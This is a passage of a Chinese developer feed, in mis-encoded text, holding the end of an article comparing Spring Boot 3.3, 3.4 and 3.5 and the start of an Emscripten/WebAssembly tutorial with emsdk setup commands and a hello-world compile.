<li>Java 17 æˆä¸ºæœ€ä½é—¨æ§›</li>
</ul>
</li>
<li>
<p><strong>3.3â€“3.4ï¼šèƒ½åŠ›å®Œå–„æœŸ</strong></p>
<ul>
<li>æ€§èƒ½ã€å¯è§‚æµ‹æ€§ã€äº‘åŸç”Ÿ</li>
<li>è™šæ‹Ÿçº¿ç¨‹ã€ç»“æ„åŒ–æ—¥å¿—å¼€å§‹â€œå¯ç”¨â€</li>
</ul>
</li>
<li>
<p><strong>3.5 åŠä»¥åï¼šç”Ÿäº§æˆç†ŸæœŸ</strong></p>
<ul>
<li>é»˜è®¤é…ç½®æ›´åç”Ÿäº§</li>
<li>äº‘åŸç”Ÿä¸å®¹å™¨ä¼˜å…ˆ</li>
<li>è¿ç»´ã€å¯è§‚æµ‹ã€å®‰å…¨èƒ½åŠ›ç³»ç»ŸåŒ–</li>
</ul>
</li>
</ol>
<p><strong>æœ¬æ–‡èšç„¦çš„ 3.3 / 3.4 / 3.5ï¼Œæ­£å¥½è¦†ç›–â€œæˆç†ŸæœŸçš„ä¸‰ä¸ªå…³é”®èŠ‚ç‚¹â€ã€‚</strong></p>
<hr/>
<h2 data-id="heading-1">äºŒã€ç‰ˆæœ¬çº¿ä¸ç”Ÿå‘½å‘¨æœŸï¼šå…ˆçœ‹â€œèƒ½ä¸èƒ½ç”¨â€ï¼Œå†è°ˆâ€œå¥½ä¸å¥½ç”¨â€</h2>
<h3 data-id="heading-2">1ï¸âƒ£ ç‰ˆæœ¬ä¸æ”¯æŒçŠ¶æ€æ€»è§ˆï¼ˆ2026 è§†è§’ï¼‰</h3>

































<table><thead><tr><th>ç‰ˆæœ¬çº¿</th><th>åˆå§‹å‘å¸ƒæ—¶é—´</th><th>å½“å‰çŠ¶æ€</th><th>ç¤¾åŒºæ”¯æŒ</th><th>æŠ€æœ¯å®šä½</th></tr></thead><tbody><tr><td>3.3.x</td><td>2024-05</td><td>âŒ å·²é€€å½¹</td><td>å·²ç»“æŸ</td><td>è¿‡æ¸¡ç¨³å®š</td></tr><tr><td>3.4.x</td><td>2024-11</td><td>âš  EOL</td><td>å³å°†/å·²ç»“æŸ</td><td>ä¸­æœŸå¢å¼º</td></tr><tr><td>3.5.x</td><td>2025-05</td><td>âœ… ä¸»æµ</td><td>æ´»è·ƒç»´æŠ¤</td><td>ç”Ÿäº§ä¸»çº¿</td></tr></tbody></table>
<p><strong>ç»“è®ºä¸€å¥è¯</strong>ï¼š</p>
<blockquote>
<p><strong>3.3/3.4 æ˜¯â€œæ›¾ç»ç¨³å®šâ€ï¼Œ3.5 æ˜¯â€œå½“å‰æ­£ç¡®â€ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-3">2ï¸âƒ£ æœ€æ–°å°ç‰ˆæœ¬ &amp; æœ€ç¨³å®šå°ç‰ˆæœ¬ï¼ˆéå¸¸å…³é”®ï¼‰</h3>
<p>è¿™æ˜¯ä½ åœ¨ç”Ÿäº§ç¯å¢ƒæœ€å…³å¿ƒçš„éƒ¨åˆ†ï¼š</p>





























<table><thead><tr><th>ç‰ˆæœ¬çº¿</th><th>æœ€æ–°å°ç‰ˆæœ¬</th><th>æœ€ç¨³å®šå°ç‰ˆæœ¬</th><th>å»ºè®®æ€åº¦</th></tr></thead><tbody><tr><td>3.3.x</td><td>3.3.6</td><td>3.3.6</td><td>âŒ ä»…å­˜é‡ç³»ç»Ÿ</td></tr><tr><td>3.4.x</td><td>3.4.13</td><td>3.4.5</td><td>âŒ ä¸å»ºè®®æ–°ç”¨</td></tr><tr><td>3.5.x</td><td>3.5.9</td><td>3.5.9</td><td>âœ… å¼ºçƒˆæ¨è</td></tr></tbody></table>
<blockquote>
<p>âš  <strong>ä¸€ä¸ªé‡è¦åŸåˆ™</strong><br/>
åœ¨ Spring Boot çš„èŠ‚å¥ä¸‹ï¼š<br/>
<strong>â€œæœ€æ–°å°ç‰ˆæœ¬ = æœ€ç¨³å®šå°ç‰ˆæœ¬â€</strong><br/>
å› ä¸ºå°ç‰ˆæœ¬å‡ ä¹åªä¿® Bug å’Œå®‰å…¨é—®é¢˜ï¼Œä¸å¼•å…¥ç ´åæ€§å˜æ›´ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€åº•å±‚æŠ€æœ¯æ ˆæ¼”è¿›ï¼šä¸æ˜¯â€œåŠŸèƒ½å·®å¼‚â€ï¼Œè€Œæ˜¯â€œæ¶æ„é‡å¿ƒè½¬ç§»â€</h2>
<h3 data-id="heading-5">1ï¸âƒ£ Java ä¸ JVM ç”Ÿæ€æ”¯æŒ</h3>



































<table><thead><tr><th>ç»´åº¦</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>æœ€ä½ Java</td><td>17</td><td>17</td><td>17</td></tr><tr><td>æ¨è Java</td><td>17 / 21</td><td>21</td><td><strong>21 / 23</strong></td></tr><tr><td>Loom æ”¯æŒ</td><td>å®éªŒçº§</td><td>å¯ç”Ÿäº§</td><td><strong>é»˜è®¤å‹å¥½</strong></td></tr><tr><td>CDS / å¯åŠ¨ä¼˜åŒ–</td><td>åŸºç¡€</td><td>æ”¹è¿›</td><td><strong>æˆç†Ÿ</strong></td></tr></tbody></table>
<p><strong>æ·±åº¦è§£è¯»</strong>ï¼š</p>
<ul>
<li><strong>3.3.x</strong>ï¼šè¿˜èƒ½â€œå…¼å®¹ 17 å¿ƒæ€â€</li>
<li><strong>3.4.x</strong>ï¼šå¼€å§‹ä¸º Java 21 åšå‡†å¤‡</li>
<li><strong>3.5.x</strong>ï¼šæ˜æ˜¾å‡è®¾ä½ â€œå·²ç»åœ¨ç”¨ 21â€</li>
</ul>
<blockquote>
<p>å¦‚æœä½ ç°åœ¨è¿˜åœ¨ <strong>JDK 17</strong>ï¼š<br/>
ğŸ‘‰ 3.5 ä¾ç„¶æ²¡é—®é¢˜ï¼Œä½†<strong>æœ€ä½³å®è·µå·²ç»æŒ‡å‘ 21</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-6">å››ã€æ€§èƒ½ä¸å¹¶å‘æ¨¡å‹ï¼šä»â€œçº¿ç¨‹æ± â€åˆ°â€œè°ƒåº¦æ¨¡å‹â€</h2>
<h3 data-id="heading-7">1ï¸âƒ£ è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰çš„æ¼”è¿›</h3>





























<table><thead><tr><th>æ–¹é¢</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>æ”¯æŒçŠ¶æ€</td><td>å¯ç”¨ä½†è°¨æ…</td><td>æ¨èä½¿ç”¨</td><td><strong>ç”Ÿäº§é»˜è®¤å€™é€‰</strong></td></tr><tr><td>Web MVC</td><td>éœ€æ˜¾å¼é…ç½®</td><td>æ”¯æŒæ›´å¥½</td><td><strong>æ·±åº¦ä¼˜åŒ–</strong></td></tr><tr><td>JDBC / é˜»å¡è°ƒç”¨</td><td>é£é™©å­˜åœ¨</td><td>æ”¹å–„</td><td><strong>é€‚é…åº¦é«˜</strong></td></tr></tbody></table>
<p><strong>å…³é”®å˜åŒ–ä¸åœ¨â€œèƒ½ä¸èƒ½ç”¨â€ï¼Œè€Œåœ¨â€œæ•¢ä¸æ•¢ç”¨â€</strong> ï¼š</p>
<ul>
<li>3.3ï¼šæŠ€æœ¯é¢„è§ˆ</li>
<li>3.4ï¼šæ¶æ„å¸ˆå°è¯•</li>
<li>3.5ï¼šå¯ä»¥å†™è¿›æ¶æ„è§„èŒƒ</li>
</ul>
<hr/>
<h3 data-id="heading-8">2ï¸âƒ£ å¯åŠ¨é€Ÿåº¦ä¸å†…å­˜æ¨¡å‹</h3>
<ul>
<li>3.3 å¼•å…¥ CDS + AOT æ”¹å–„</li>
<li>3.4 ä¼˜åŒ– Bean åˆå§‹åŒ–é¡ºåº</li>
<li><strong>3.5 é’ˆå¯¹å®¹å™¨å¯åŠ¨ã€K8s æ»šåŠ¨å‘å¸ƒæ˜¾è‘—ä¼˜åŒ–</strong></li>
</ul>
<p>ğŸ‘‰ å¯¹ <strong>å¾®æœåŠ¡ / Serverless / å¼¹æ€§æ‰©ç¼©å®¹</strong> éå¸¸å…³é”®</p>
<hr/>
<h2 data-id="heading-9">äº”ã€å¯è§‚æµ‹æ€§ï¼ˆObservabilityï¼‰ï¼šä»â€œå¯é€‰èƒ½åŠ›â€åˆ°â€œé»˜è®¤èƒ½åŠ›â€</h2>
<h3 data-id="heading-10">1ï¸âƒ£ æ—¥å¿—ä½“ç³»çš„è´¨å˜ï¼šç»“æ„åŒ–æ—¥å¿—</h3>





























<table><thead><tr><th>ç»´åº¦</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>JSON æ—¥å¿—</td><td>éœ€è‡ªé…</td><td>åŠè‡ªåŠ¨</td><td><strong>å®˜æ–¹æ¨è</strong></td></tr><tr><td>TraceId è´¯é€š</td><td>åŸºç¡€</td><td>æ”¹è¿›</td><td><strong>é»˜è®¤æ›´åˆç†</strong></td></tr><tr><td>äº‘æ—¥å¿—å¹³å°</td><td>éœ€é€‚é…</td><td>å‹å¥½</td><td><strong>åŸç”Ÿå‹å¥½</strong></td></tr></tbody></table>
<p><strong>è¿™æ˜¯ä¸€ä¸ªè´¨å˜ç‚¹</strong>ï¼š<br/>
Spring Boot 3.5 æ˜æ˜¾å‡è®¾ä½ çš„æ—¥å¿—ä¼šè¢« <strong>ELK / Loki / OpenTelemetry</strong> æ¶ˆè´¹ï¼Œè€Œä¸æ˜¯äººè‚‰ grepã€‚</p>
<hr/>
<h3 data-id="heading-11">2ï¸âƒ£ Metrics / Tracing</h3>
<ul>
<li>Micrometer å…¨çº¿å‡çº§</li>
<li>Prometheus / OTEL ä½“éªŒé€ä»£æ”¹å–„</li>
<li>3.5 ä¸­è‡ªåŠ¨é…ç½®â€œæ›´æ¿€è¿›ä½†æ›´åˆç†â€</li>
</ul>
<hr/>
<h2 data-id="heading-12">å…­ã€å®‰å…¨ä¸é…ç½®æ¨¡å‹ï¼šä»â€œå¯é…ç½®â€åˆ°â€œå®‰å…¨é»˜è®¤â€</h2>
<h3 data-id="heading-13">1ï¸âƒ£ Spring Security ç”Ÿæ€</h3>





























<table><thead><tr><th>ç»´åº¦</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>Security é»˜è®¤ç­–ç•¥</td><td>ä¿å®ˆ</td><td>æ”¶ç´§</td><td><strong>æ›´å®‰å…¨</strong></td></tr><tr><td>SSL / Service Connection</td><td>åŸºç¡€</td><td>æ”¹å–„</td><td><strong>ä¸€ç­‰å…¬æ°‘</strong></td></tr><tr><td>OAuth2 / JWT</td><td>ç¨³å®š</td><td>æˆç†Ÿ</td><td><strong>ç”Ÿäº§å‹å¥½</strong></td></tr></tbody></table>
<blockquote>
<p><strong>å‡çº§é£é™©ç‚¹æé†’</strong><br/>
3.5 å¯¹éƒ¨åˆ†å®‰å…¨é»˜è®¤å€¼æ›´ä¸¥æ ¼<br/>
ğŸ‘‰ è€é¡¹ç›®å‡çº§å¿…é¡»è·‘å®Œæ•´å›å½’æµ‹è¯•</p>
</blockquote>
<hr/>
<h2 data-id="heading-14">ä¸ƒã€äº‘åŸç”Ÿä¸å®¹å™¨ï¼š3.5 æ˜¯â€œä¸º K8s è€Œç”Ÿâ€</h2>
<h3 data-id="heading-15">1ï¸âƒ£ å®¹å™¨åŒ–èƒ½åŠ›å¯¹æ¯”</h3>





























<table><thead><tr><th>èƒ½åŠ›</th><th>3.3.x</th><th>3.4.x</th><th>3.5.x</th></tr></thead><tbody><tr><td>Buildpacks</td><td>æ”¯æŒ</td><td>ä¼˜åŒ–</td><td><strong>æœ€ä½³å®è·µ</strong></td></tr><tr><td>K8s æ¢é’ˆ</td><td>å¯ç”¨</td><td>æ”¹è¿›</td><td><strong>æ·±åº¦é›†æˆ</strong></td></tr><tr><td>Service Binding</td><td>åŸºç¡€</td><td>æ”¹å–„</td><td><strong>æˆç†Ÿ</strong></td></tr></tbody></table>
<p><strong>3.5 æ˜ç¡®æ˜¯â€œäº‘åŸç”Ÿä¼˜å…ˆè®¾è®¡â€</strong><br/>
å¦‚æœä½ æ˜¯ï¼š</p>
<ul>
<li>å¾®æœåŠ¡</li>
<li>Kubernetes</li>
<li>äº‘æ‰˜ç®¡æ•°æ®åº“</li>
</ul>
<p>ğŸ‘‰ <strong>3.5 æ²¡æœ‰æ›¿ä»£é€‰é¡¹</strong></p>
<hr/>
<h2 data-id="heading-16">å…«ã€å‡çº§è·¯å¾„ä¸é£é™©æ§åˆ¶ï¼ˆéå¸¸å®æˆ˜ï¼‰</h2>
<h3 data-id="heading-17">1ï¸âƒ£ ä¸åŒèµ·ç‚¹çš„æ¨èè·¯å¾„</h3>





















<table><thead><tr><th>å½“å‰ç‰ˆæœ¬</th><th>æ¨èè·¯å¾„</th></tr></thead><tbody><tr><td>3.0â€“3.2</td><td>3.2 â†’ 3.3 â†’ 3.5</td></tr><tr><td>3.3.x</td><td><strong>3.3 â†’ 3.5ï¼ˆå¯è·³è¿‡ 3.4ï¼‰</strong></td></tr><tr><td>3.4.x</td><td>ç›´æ¥ 3.5</td></tr></tbody></table>
<h3 data-id="heading-18">2ï¸âƒ£ æ ¸å¿ƒé£é™©ç‚¹æ¸…å•</h3>
<ul>
<li>Spring Security é»˜è®¤è¡Œä¸ºå˜åŒ–</li>
<li>æ—¥å¿—æ ¼å¼å˜åŒ–ï¼ˆJSONï¼‰</li>
<li>Executor / Task é…ç½®å·®å¼‚</li>
<li>å°‘é‡è‡ªåŠ¨é…ç½® Bean è¡Œä¸ºè°ƒæ•´</li>
</ul>
<p>ğŸ‘‰ <strong>ä½†éƒ½ä¸æ˜¯â€œæ¶æ„çº§ç ´åâ€</strong></p>
<hr/>
<h2 data-id="heading-19">ä¹ã€æœ€ç»ˆé€‰å‹å»ºè®®ï¼ˆç»“è®ºç‰ˆï¼‰</h2>
<h3 data-id="heading-20">âœ… æ–°é¡¹ç›®</h3>
<blockquote>
<p><strong>æ— æ¡ä»¶é€‰ Spring Boot 3.5.x æœ€æ–°å°ç‰ˆæœ¬</strong></p>
</blockquote>
<p>ç†ç”±ï¼š</p>
<ul>
<li>ç”Ÿå‘½å‘¨æœŸæœ€é•¿</li>
<li>äº‘åŸç”Ÿæœ€æˆç†Ÿ</li>
<li>Java 21 æœ€ä½³æ‹æ¡£</li>
</ul>
<hr/>
<h3 data-id="heading-21">âœ… è€é¡¹ç›®ï¼ˆä¼ä¸šçº§ï¼‰</h3>

























<table><thead><tr><th>åœºæ™¯</th><th>å»ºè®®</th></tr></thead><tbody><tr><td>è¿½æ±‚ç¨³å®š</td><td>3.5.x</td></tr><tr><td>æŠ€æœ¯å€ºå¤š</td><td>åˆ†é˜¶æ®µå‡çº§</td></tr><tr><td>é«˜å¹¶å‘</td><td>3.5 + Virtual Threads</td></tr><tr><td>äº‘åŸç”Ÿ</td><td>3.5 å¿…é€‰</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-22">åã€ä¸€å¥è¯æ€»ç»“</h2>
<blockquote>
<p><strong>Spring Boot 3.3 æ˜¯â€œèƒ½ç”¨â€ï¼Œ3.4 æ˜¯â€œå¥½ç”¨â€ï¼Œ3.5 æ˜¯â€œè¯¥ç”¨â€ã€‚</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[WebAssemblyå…¥é—¨ï¼ˆä¸€ï¼‰â€”â€”Emscripten]]></title>    <link>https://juejin.cn/post/7592823500416090138</link>    <guid>https://juejin.cn/post/7592823500416090138</guid>    <pubDate>2026-01-08T11:30:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592823500416090138" data-draft-id="7592816646869041161" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="WebAssemblyå…¥é—¨ï¼ˆä¸€ï¼‰â€”â€”Emscripten "/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T11:30:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¸ƒåˆ—ç‘Ÿå†œçš„æ˜Ÿç©º"/> <meta itemprop="url" content="https://juejin.cn/user/976022056218471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            WebAssemblyå…¥é—¨ï¼ˆä¸€ï¼‰â€”â€”Emscripten 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022056218471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¸ƒåˆ—ç‘Ÿå†œçš„æ˜Ÿç©º
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T11:30:45.000Z" title="Thu Jan 08 2026 11:30:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">WebAssemblyä»‹ç»</h2>
<p>WebAssemblyï¼Œç®€å•æ¥è¯´ï¼Œæ˜¯ä¸€ç§æµè§ˆå™¨å¯æ‰§è¡Œçš„ä»£ç æ ¼å¼ï¼Œè¯¸å¦‚ Cã€C++ å’Œ Rust ç­‰æºè¯­è¨€èƒ½å¤Ÿç¼–è¯‘ä¸ºWebAssemblyä»£ç ï¼Œå¹¶æš´éœ²å¯ä¾›jsè°ƒç”¨çš„å‡½æ•°ï¼Œä½¿å¾—jsèƒ½å¤Ÿåˆ©ç”¨æ¥è¿‘åŸç”Ÿçš„é€Ÿåº¦å®Œæˆä¸€äº›é€»è¾‘ã€‚</p>
<p>å…³äºWebAssemblyçš„ä»‹ç»ï¼ŒMDNå·²ç»è¶³å¤Ÿè¯¦ç»†äº†ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWebAssembly%2FGuides%2FConcepts" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Guides/Concepts" ref="nofollow noopener noreferrer">developer.mozilla.org/zh-CN/docs/â€¦</a>  ,ä¸å†èµ˜è¿°ã€‚</p>
<h2 data-id="heading-1">Emscripten ä»‹ç»å’Œå®‰è£…</h2>
<p>Emscripten æ˜¯ä¸€ä¸ªåŸºäº LLVM/Clang çš„å¼€æºç¼–è¯‘å™¨å·¥å…·é“¾ï¼Œæ ¸å¿ƒæ˜¯å°† C/C++ ç­‰åŸç”Ÿä»£ç ç¼–è¯‘ä¸º WebAssemblyï¼ˆWasmï¼‰å’Œ JavaScript â€œèƒ¶æ°´ä»£ç â€ï¼Œè®©é«˜æ€§èƒ½åŸç”Ÿç¨‹åºä¸åº“èƒ½åœ¨æµè§ˆå™¨ã€Node.js åŠå…¶ä»– Wasm è¿è¡Œæ—¶é«˜æ•ˆæ‰§è¡Œï¼Œæ€§èƒ½æ¥è¿‘åŸç”Ÿï¼Œæ˜¯åŸç”Ÿä»£ç å‘ Web è¿ç§»çš„æ ¸å¿ƒå·¥å…·ã€‚æ›´å¤šä¿¡æ¯å¯è®¿é—®å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Femscripten.org%2Fdocs%2Findex.html" target="_blank" title="https://emscripten.org/docs/index.html" ref="nofollow noopener noreferrer">emscripten.org/docs/index.â€¦</a></p>
<h3 data-id="heading-2">å®‰è£…</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Get the emsdk repo</span>
git <span class="hljs-built_in">clone</span> https://github.com/emscripten-core/emsdk.git

<span class="hljs-comment"># Enter that directory</span>
<span class="hljs-built_in">cd</span> emsdk
<span class="hljs-comment"># Fetch the latest version of the emsdk (not needed the first time you clone)</span>
git pull

<span class="hljs-comment"># Download and install the latest SDK tools.</span>
./emsdk install latest

<span class="hljs-comment"># Make the "latest" SDK "active" for the current user. (writes .emscripten file)</span>
./emsdk activate latest

<span class="hljs-comment"># Activate PATH and other environment variables in the current terminal</span>
<span class="hljs-built_in">source</span> ./emsdk_env.sh
</code></pre>
<p>æ³¨ï¼šwindowsç³»ç»Ÿç”¨<code>emsdk.bat</code>æ›¿æ¢ä¸Šè¿°å‘½ä»¤ä¸­çš„<code>emsdk</code>ï¼Œç”¨<code>emsdk_env.bat</code>æ›¿æ¢ä¸Šè¿°å‘½ä»¤ä¸­çš„<code>source ./emsdk_env.sh</code>ã€‚</p>
<h4 data-id="heading-3">å®‰è£…éªŒè¯</h4>
<p>åœ¨ Emscripten çš„å®‰è£…ç›®å½•ä¸‹æ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ</p>
<pre><code class="hljs language-bash" lang="bash">./emcc --check
</code></pre>
<p>æ³¨ï¼š</p>
<ul>
<li><strong>windowsç³»ç»Ÿ</strong>ï¼Œé€šè¿‡åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¹¶æ‰“å¼€<strong>emcmdprompt.bat</strong>æ¥å¯åŠ¨è¯¥æç¤ºç¬¦ï¼Œåœ¨å…¶ä»–å‘½ä»¤è¡Œä¸­æ˜¯æ‰¾ä¸åˆ°emccçš„ã€‚</li>
<li><strong>åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨emcc</strong>è€Œä¸æ˜¯ <strong>./emcc</strong>æ¥è°ƒç”¨è¯¥å·¥å…·ã€‚</li>
</ul>
<p>å®‰è£…æˆåŠŸåcheckçš„è¾“å‡ºå¦‚ä¸‹ï¼š
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d88e077f6d0429dbea009a7830a2562~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5biD5YiX55Gf5Yac55qE5pif56m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768476644&amp;x-signature=FRGyKCcGC%2Fw0sYLqrPt%2FwVk2K6c%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">å…¥é—¨å®è·µ</h2>
<h3 data-id="heading-5">hello world</h3>
<p>å‡†å¤‡åŸºç¡€æµ‹è¯•æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// test.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello from Emscripten!\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>æ‰§è¡Œç¼–è¯‘</p>
<pre><code class="hljs language-bash" lang="bash">emcc test.c -o test.html <span class="hljs-comment"># ç”Ÿæˆtest.html + test.js + test.wasm</span>
</code></pre>
<p>å¯åŠ¨æœ¬åœ°æœåŠ¡å™¨ï¼Œæ‰“å¼€test.html</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d77489e4e11f4aa496313dd1e0d1bd29~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5biD5YiX55Gf5Yac55qE5pif56m6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768476644&amp;x-signature=baYlgl0jBz9WM26CbHL9jnrmyHo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">ç”Ÿæˆæ–‡ä»¶ä»‹ç»</h4>
<h5 data-id="heading-7">test.html</h5>
